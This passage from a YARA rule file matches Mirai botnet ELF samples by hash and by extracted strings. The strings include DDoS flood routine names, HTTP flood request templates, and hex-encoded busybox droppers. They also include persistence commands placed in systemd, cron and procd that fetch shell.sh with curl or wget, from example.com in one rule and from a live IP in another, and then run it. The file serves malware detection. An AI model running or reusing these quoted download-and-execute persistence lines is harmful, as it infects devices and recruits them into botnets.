      $s12 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s13 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s14 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s15 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d144ff0_Mirai_signature__70ae2421_Mirai_signature__70f473c7_Mirai_signature__844ac003_Mirai_signature__84_22 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d144ff0.elf, Mirai(signature)_70ae2421.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_844ac003.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_85522c0c.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_919d2b3d.elf, Mirai(signature)_9538fec5.elf, Mirai(signature)_9eada9e7.elf, Mirai(signature)_a99c4815.elf, Mirai(signature)_aa2a31bc.elf, Mirai(signature)_ab270778.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d144ff0ea4ee4c4b69c74316a9e0316db85efb4b24eee079238ca699c8d22b4"
      hash2 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash3 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash4 = "844ac003aa6961360aa376bb5cc0deee0e48fcf688bdc8ece09a86cea4cb7f01"
      hash5 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash6 = "85522c0c606792d409f3dd9faf8f89d72378c6b31e6d04bd5e4ad7d9c96fccd6"
      hash7 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash8 = "919d2b3dd85c5d1e9191cd3c972135a7a570bcc8c54193f74062aec265adf843"
      hash9 = "9538fec56c2f7397772a1d3bd3a909165b295ee2acbe4a8349735d270fb6926f"
      hash10 = "9eada9e76633b0ee6b5e79d12976e46f8c5b6e5a91e15e3ef0143a5958cbeb0c"
      hash11 = "a99c4815b1e9e3e80c5153d00e7d6cf56994b81cfec6570a018472b89b82bac1"
      hash12 = "aa2a31bc57e8e83fcf8c757acd5eeb2aacb0a528486c314c0574e5e93d8962e4"
      hash13 = "ab270778dd3275544a794b0961f2880965f340a3a2c1b51b1c2f343163e7c59c"
   strings:
      $s1 = "Host: %s.com" fullword ascii /* score: '26.00'*/
      $s2 = "X-Forwarded-Host: %s.com" fullword ascii /* score: '26.00'*/
      $s3 = "user-agent: %s" fullword ascii /* score: '17.00'*/
      $s4 = "GET %s HTTP/3.0" fullword ascii /* score: '15.00'*/
      $s5 = "GET %s?%s=%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s6 = "{\"query\":\"query { posts { id title content } }\"}" fullword ascii /* score: '14.00'*/
      $s7 = "{\"query\":\"query { users { id name email } }\"}" fullword ascii /* score: '12.00'*/
      $s8 = "{\"query\":\"mutation { updateUser(id: \\\"%d\\\", input: {name: \\\"%s\\\"}) { id } }\"}" fullword ascii /* score: '10.00'*/
      $s9 = "Content-Encoding: br" fullword ascii /* score: '9.00'*/
      $s10 = "X-Host: %s" fullword ascii /* score: '9.00'*/
      $s11 = "X-Original-Host: %s" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__711505d2_Mirai_signature__851a9a61_Mirai_signature__93d8b25a_Mirai_signature__9e3be224_Mirai_signature__a5_23 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_711505d2.elf, Mirai(signature)_851a9a61.elf, Mirai(signature)_93d8b25a.elf, Mirai(signature)_9e3be224.elf, Mirai(signature)_a5bf50ec.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "711505d206fd8744ca6cd63e6b6ed285c9c700abc6e2b5d80ff04a21e52dec4b"
      hash2 = "851a9a61b1a36c9f4f71ada33e62b2813f2a99fb2a11b52276da5138a3a3baa0"
      hash3 = "93d8b25a0ec941e3f7aaa4be9c09e70ec40ca6f8b02c32373e72edaab112e19a"
      hash4 = "9e3be2242a558e993d1f7628f9f3c99944c9e6aa3fa8b3524c3674b2de377b74"
      hash5 = "a5bf50ecb5d645168151c4cfc74d936fdccf28c7c4f87bf7bbfb8d1f64837bb2"
   strings:
      $s1 = "[tcpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s2 = "[udpbypass_flood] socket() failed" fullword ascii /* score: '23.00'*/
      $s3 = "[udpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s4 = "[icmp_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s5 = "[icmp_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s6 = "[udp_plain_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s7 = "[icmp_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s8 = "[syn_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s9 = "[udp_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s10 = "[udp_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s11 = "[ack_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s12 = "[syn_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s13 = "[ack_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s14 = "[syn_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s15 = "[psh_ack_flood] socket() failed" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d144ff0_Mirai_signature__6ff21f19_Mirai_signature__70ae2421_Mirai_signature__70e11049_Mirai_signature__70_24 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d144ff0.elf, Mirai(signature)_6ff21f19.elf, Mirai(signature)_70ae2421.elf, Mirai(signature)_70e11049.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_7cd90cfd.elf, Mirai(signature)_7e528454.elf, Mirai(signature)_8206a861.elf, Mirai(signature)_844ac003.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_85522c0c.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_89fa8230.elf, Mirai(signature)_919d2b3d.elf, Mirai(signature)_93f45b93.elf, Mirai(signature)_9538fec5.elf, Mirai(signature)_994c14d7.elf, Mirai(signature)_9eada9e7.elf, Mirai(signature)_a3bf5ed2.elf, Mirai(signature)_a915b420.elf, Mirai(signature)_a99c4815.elf, Mirai(signature)_aa2a31bc.elf, Mirai(signature)_aa73dbf2.elf, Mirai(signature)_aace2180.elf, Mirai(signature)_ab270778.elf, Mirai(signature)_ae93d820.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d144ff0ea4ee4c4b69c74316a9e0316db85efb4b24eee079238ca699c8d22b4"
      hash2 = "6ff21f19a4a1562c280c1fb54b59c5e3463615a6f3351474fb7d1e7c4efc9b56"
      hash3 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash4 = "70e110499d9b759dd240fad8e9a79bf21cb61801ef7f9bd7de9e4fe2b840ab4d"
      hash5 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash6 = "7cd90cfd49f396a76d90a287400e3b0190535bc50457419c9b8689409a99954f"
      hash7 = "7e528454073e710cadec7898d48732ef5ea60abe6951b5c4c4da7478f43f7483"
      hash8 = "8206a86179a3c93abee46ec9a8aa7b9157af261afd0b128394941b5dface1571"
      hash9 = "844ac003aa6961360aa376bb5cc0deee0e48fcf688bdc8ece09a86cea4cb7f01"
      hash10 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash11 = "85522c0c606792d409f3dd9faf8f89d72378c6b31e6d04bd5e4ad7d9c96fccd6"
      hash12 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash13 = "89fa82309afe76391b58e5d7a611e41d9743304f9d552fd10510cf062463928c"
      hash14 = "919d2b3dd85c5d1e9191cd3c972135a7a570bcc8c54193f74062aec265adf843"
      hash15 = "93f45b931fa5ad9803f8ed844bb4b7bac84bac9a1acd44c3dcb52a5441cb04ed"
      hash16 = "9538fec56c2f7397772a1d3bd3a909165b295ee2acbe4a8349735d270fb6926f"
      hash17 = "994c14d7ab6080f0eb3ba996371ce1438bba81cceaf120852832f29fb5df0340"
      hash18 = "9eada9e76633b0ee6b5e79d12976e46f8c5b6e5a91e15e3ef0143a5958cbeb0c"
      hash19 = "a3bf5ed2eb9c21403a3894b0f182ea6d21eb571dcaa566fbf9d02473303edc4c"
      hash20 = "a915b420e954036c4fc660f627a19d197aa605100f0bc7903a615e08703b5a7f"
      hash21 = "a99c4815b1e9e3e80c5153d00e7d6cf56994b81cfec6570a018472b89b82bac1"
      hash22 = "aa2a31bc57e8e83fcf8c757acd5eeb2aacb0a528486c314c0574e5e93d8962e4"
      hash23 = "aa73dbf28fe4883fdf873a3a0ffb19796bf7ac1da5e1e59a4fda535ed9247ae3"
      hash24 = "aace21809106166db09e47921b7db054de61e6f62b4dfc98c7297b7245f0f908"
      hash25 = "ab270778dd3275544a794b0961f2880965f340a3a2c1b51b1c2f343163e7c59c"
      hash26 = "ae93d820fb2fd9ec80de19f11ef6254b741d96de849f449ef664334e410eb8a6"
   strings:
      $s1 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s2 = "gethostbyname.c" fullword ascii /* score: '14.00'*/
      $s3 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s4 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s5 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s6 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s7 = "__GI_gethostbyname" fullword ascii /* score: '14.00'*/
      $s8 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s9 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s10 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s11 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s12 = "__open_etc_hosts" fullword ascii /* score: '9.00'*/
      $s13 = "encoded.c" fullword ascii /* score: '9.00'*/
      $s14 = "__encode_header" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d5f13ad_Mirai_signature__70233742_Mirai_signature__702d0712_Mirai_signature__70b4d0fb_Mirai_signature__73_25 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d5f13ad.elf, Mirai(signature)_70233742.elf, Mirai(signature)_702d0712.elf, Mirai(signature)_70b4d0fb.elf, Mirai(signature)_7369befa.elf, Mirai(signature)_73ca547c.elf, Mirai(signature)_75fe77dd.elf, Mirai(signature)_7814e080.elf, Mirai(signature)_79aa2ab1.elf, Mirai(signature)_7a246375.elf, Mirai(signature)_7f0ec0ae.elf, Mirai(signature)_80f6fae7.elf, Mirai(signature)_81a4de40.elf, Mirai(signature)_81c4c4de.elf, Mirai(signature)_85088762.elf, Mirai(signature)_868c139f.elf, Mirai(signature)_87dc939b.elf, Mirai(signature)_88205620.elf, Mirai(signature)_8a9a5f5f.elf, Mirai(signature)_8ba790cf.elf, Mirai(signature)_8dfe2343.elf, Mirai(signature)_8fef7dd2.elf, Mirai(signature)_90f10730.elf, Mirai(signature)_923e3a24.elf, Mirai(signature)_930f1916.elf, Mirai(signature)_94607fcc.elf, Mirai(signature)_96eeceb8.elf, Mirai(signature)_980313e3.elf, Mirai(signature)_98e064f1.elf, Mirai(signature)_9a9c9083.elf, Mirai(signature)_9b865817.elf, Mirai(signature)_9ba8a0de.elf, Mirai(signature)_9cab7a52.elf, Mirai(signature)_9dc453dd.elf, Mirai(signature)_9dfdd53e.elf, Mirai(signature)_9e81bdfc.elf, Mirai(signature)_9fcd74fe.elf, Mirai(signature)_a4016bd7.elf, Mirai(signature)_a56de603.elf, Mirai(signature)_a66c3f07.elf, Mirai(signature)_a97aeb44.elf, Mirai(signature)_a98a5760.elf, Mirai(signature)_a9fe58e4.elf, Mirai(signature)_ab3c438e.elf, Mirai(signature)_abbe5a87.elf, Mirai(signature)_ae209387.elf, Mirai(signature)_afc6b034.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d5f13ada8501291aaf62f53db22577615d16f6a4755bc83b66a7a12bae039b2"
      hash2 = "7023374287293202bd9794076550553181695ad19f51a5a8b242ec334644b84d"
      hash3 = "702d0712786d9cf7567ac92ee70e5b3da5c358bcc5e0876442cbd636d7d1e6f5"
      hash4 = "70b4d0fb871bce5751432308588a35df17c4289fc510daca98a2bbd29b1cb03f"
      hash5 = "7369befa4aef8dfc8e9cd6a7449c944b614f4ad57d90984a0450b035199ac5b5"
      hash6 = "73ca547c2e29de12ca67bc3536063726d39a8790d525a301bf9d761d3e9831b9"
      hash7 = "75fe77dd77013bb89f7877de23f328a84ab410d1c2a7519e90da6773367c5c51"
      hash8 = "7814e080505f7f7c13dffc6705bee00d3eb9ae88d8a0d36b0c69cef6622fcf30"
      hash9 = "79aa2ab18d3c9354675a0af31339ebea64f876108c7b39ef0a9e7ddf8740e214"
      hash10 = "7a2463757caa27c347ee3f301a7ae1b2d7881ac305cf6c9ca78d35e6be943f12"
      hash11 = "7f0ec0ae8f5195468c98f26080e2bee8b370a4c7febcc156eafa6ae5dbc21809"
      hash12 = "80f6fae7894ad2c9c5a5193755eaf4d1eb80141cccb66fa35042b39ba844c0bc"
      hash13 = "81a4de40df5439551834e48c097107dd9176e89046e26127afbce71e614b0359"
      hash14 = "81c4c4deb29820b176bf08f1fd0fcabb64c7dce256645f3aae0411b378befc97"
      hash15 = "85088762d55a62537b044526545f72265778d85504cbab15d830881edf068bb9"
      hash16 = "868c139fb6669442895e64614b05b7a2f0b190a0582e977e877169a0352fd014"
      hash17 = "87dc939b0c977afb24185a6893f57faa03cc97c87a0b7c9fba5ee1cb414d0465"
      hash18 = "88205620c6b85a7794fcbda32ef9069f54ecaac56663de3acfb6bfd0a067fec0"
      hash19 = "8a9a5f5f094ff1f318b90b6ad1ca0eb3eca9213fbd9a17f655804bbf2c5bf3a4"
      hash20 = "8ba790cf3f07819c0e15a612aed197567fccded3e7a5b0b61443c42050d2b984"
      hash21 = "8dfe2343b164f4c101945d1432d7bc022807fdd7de52b39d915746e9da31d319"
      hash22 = "8fef7dd2b84929146cfbb95a912d9f41832652b6829dd91a045be4f0dcb7a9ea"
      hash23 = "90f107307a8e5a27352f7102c4ff05ff0c8c891566ff0dbfdab6991e6acdafee"
      hash24 = "923e3a249551ae8345ce0c6a190ac745f768a3d50b6aabd0708757102259b74b"
      hash25 = "930f1916addc02bd033a82b384221521d5e9490f4b8a544b7c71545da3e8498b"
      hash26 = "94607fcc1bd1dd79bd0de8c9ff232fa302d1239c88c521883740b29824842c9d"
      hash27 = "96eeceb8c2303233f4ae7ffa30d19b76a78e8a31c2d64d1fd9b26bcc8338bcb6"
      hash28 = "980313e319a6901fc1a0e56e2a8646311ffc185feb29676a6c00c841317c7de8"
      hash29 = "98e064f18c98e2b9e2dd8ed60a1a566e5927a4a845959b65366e1ced02b3e7ea"
      hash30 = "9a9c908365bb9e55ca2df9c508d725827a209e25759ce8466880873f4788b6d5"
      hash31 = "9b865817a24f8eb8ad2819feb9fdf4391bd2e2d7d39f1fe095604c56d410c7ac"
      hash32 = "9ba8a0de1aa1fba45d9921c8340bb4e4b81499d0f27f280c0d5a2d319c0b8565"
      hash33 = "9cab7a52815df905dc2806b5b85aa4aa3553d5db14723831729387a882e2aac0"
      hash34 = "9dc453dd4ff9d2f57b7a76b0148aa01d5eb3f655e5e0deea18e03c16a0060210"
      hash35 = "9dfdd53e8f34644db6c583eb1c2c99dc77b5ef395bcf230b9524c95f1920d566"
      hash36 = "9e81bdfc03e6f75e7e4c892851968608e32fbe7735bfc46830ec0892783b2072"
      hash37 = "9fcd74fec43be953b48ce3263efff28766b511044033d3cbcf8851d11fd86322"
      hash38 = "a4016bd76a80622af455da0e6cd610c2172f32bc40601db1160b97740309fbcc"
      hash39 = "a56de6035d2627d3d69e296dd06a3e20bc20ac4cbb55cb1fb040ca002539eae8"
      hash40 = "a66c3f077a1a05e39fa30428349b465d8adb012fa42c683a8a01deebcc620f22"
      hash41 = "a97aeb447dfceab7af61424ed52b1ac513d03cfcd6659c4bdb82d508893d06aa"
      hash42 = "a98a576008632e06cf785bfd3e074ddfd58ef6b1e38f2b80bb71bb4169f8a2f1"
      hash43 = "a9fe58e41551822b2ea37037f633edaa735b23a8d140516d0b7fb1f6a22b7cbd"
      hash44 = "ab3c438e902a906e23b9da59c947df25f80d58468c14c887c9d92e2e6306f507"
      hash45 = "abbe5a87daa71d57edfc111d89bfd63d00df492688b9e51bd8d876f1eed99dbd"
      hash46 = "ae209387803fa66644bd8970a7d7b36db75cbd5fe993a2e4bb33f325d4777363"
      hash47 = "afc6b03443f504bf81e741311e779176503f3809bd91652508c4ee8cfd5b6316"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s3 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__93f45b93_Mirai_signature__a915b420_Mirai_signature__aace2180_26 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_93f45b93.elf, Mirai(signature)_a915b420.elf, Mirai(signature)_aace2180.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "93f45b931fa5ad9803f8ed844bb4b7bac84bac9a1acd44c3dcb52a5441cb04ed"
      hash2 = "a915b420e954036c4fc660f627a19d197aa605100f0bc7903a615e08703b5a7f"
      hash3 = "aace21809106166db09e47921b7db054de61e6f62b4dfc98c7297b7245f0f908"
   strings:
      $s1 = "HTTP.GET" fullword ascii /* score: '18.00'*/
      $s2 = "GET /%s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s3 = "GET %s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s4 = "HTTP.OVH" fullword ascii /* score: '13.00'*/
      $s5 = "parse_command" fullword ascii /* score: '12.00'*/
      $s6 = "attack_http_get" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" fullword ascii /* score: '9.00'*/
      $s10 = "make_ip_header" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__6db3a177_Mirai_signature__7cee4ac4_Mirai_signature__9db44728_Mirai_signature__aa3734d3_Mirai_signature__ad_27 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6db3a177.elf, Mirai(signature)_7cee4ac4.elf, Mirai(signature)_9db44728.elf, Mirai(signature)_aa3734d3.elf, Mirai(signature)_ad6b7a16.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6db3a1777017535d3135eaa931e02a5512be5eec3571261740d71addc050a9e6"
      hash2 = "7cee4ac4c5c52fb2d0c2d6edd4dec611dfebace1eae0d58d56b2429ff5a66397"
      hash3 = "9db4472896aa7f67644efc5cac5ad0022c0baa5e18e4adfb9ae9fb6d92ad8749"
      hash4 = "aa3734d3fc00b1ba582d9b2ba250db27334e5b094d1c40ee62234614afafce60"
      hash5 = "ad6b7a1640f575d8c0234516f5b5c68444df92e096ead00bc8501824951c7cb1"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '53.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '50.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '45.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '44.00'*/
      $x5 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x7 = "askid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '38.00'*/
      $x8 = "$t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart') | " ascii /* score: '36.00'*/
      $x9 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '36.00'*/
      $x10 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '35.00'*/
      $x11 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $s13 = "      if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s14 = "        if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s15 = "s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart)' ; echo '@hourly for t in curl wget; do T=/tmp/.s$$; if " ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__7f7f0d71_Mirai_signature__8d37351f_Mirai_signature__8e515c52_Mirai_signature__9676d340_Mirai_signature__ac_28 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_7f7f0d71.elf, Mirai(signature)_8d37351f.elf, Mirai(signature)_8e515c52.elf, Mirai(signature)_9676d340.elf, Mirai(signature)_ac47df80.elf, Mirai(signature)_ac5d1b44.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7f7f0d711bbb3fd8c747e86a594c875ace72c37a48c3b1332e14a84f92bfd0ab"
      hash2 = "8d37351feb40c8cffa43b778bc7087eb6b516b5e498244e640ab366d276d4800"
      hash3 = "8e515c524d7749bc86597c8b5b7759683fa8a614b8ab125c67ef2397bb057d6e"
      hash4 = "9676d340c5229ce5c1a79621e346bce300e02f5736133bba695438daaad87a30"
      hash5 = "ac47df80a238e71e50a70d4b63755a33db18654650a145e56838276135d6c8a6"
      hash6 = "ac5d1b44b3ac7c62d5e5872279097c57d5d3cd3992c88773fb9d86f8013388bf"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '51.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '48.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '43.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '42.00'*/
      $x5 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x7 = "raskid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [" ascii /* score: '36.00'*/
      $x8 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '34.00'*/
      $x9 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '33.00'*/
      $x10 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
